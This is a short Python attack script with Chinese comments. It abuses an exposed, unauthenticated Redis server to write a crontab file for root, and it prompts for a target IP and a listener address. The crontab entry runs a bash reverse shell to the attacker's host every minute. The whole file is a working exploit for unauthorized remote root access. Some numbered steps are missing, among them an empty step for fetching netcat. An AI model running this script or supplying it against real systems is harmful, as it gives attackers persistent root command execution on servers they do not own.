import os
import platform
import redis
import subprocess


# 1. 检查并下载 nc（Windows）


# 2. 上传反弹 shell 命令到 crontab
def upload_shell_to_crontab(redis_host, local_ip, port):
    # 构造反弹 shell 命令
    shell_command = f"\n\n* * * * * /bin/bash -i >& /dev/tcp/{local_ip}/{port} 0>&1 2>/tmp/cron_error.log\n\n"

    # 连接 Redis 并上传命令
    r = redis.Redis(host=redis_host, port=6379, decode_responses=True)
    r.config_set("dir", "/var/spool/cron/")
    r.config_set("dbfilename", "root")
    r.set("xxx", shell_command)
    r.save()
    print("反弹 shell 命令已上传到 crontab。")

# 5. 主流程
def main():
    print("确保目标系统为centos,否则可能无法反弹成功")
    redis_host = input("请输入目标主机的IP地址: ")
    local_ip = input("请输入本地监听的IP地址: ")
    port = input("请输入监听端口: ")
    upload_shell_to_crontab(redis_host, local_ip, port)

    print(f"反弹 shell 应该会在下一分钟反弹到 {local_ip}:{port}。请确保监听已启动。")


if __name__ == "__main__":
    main()
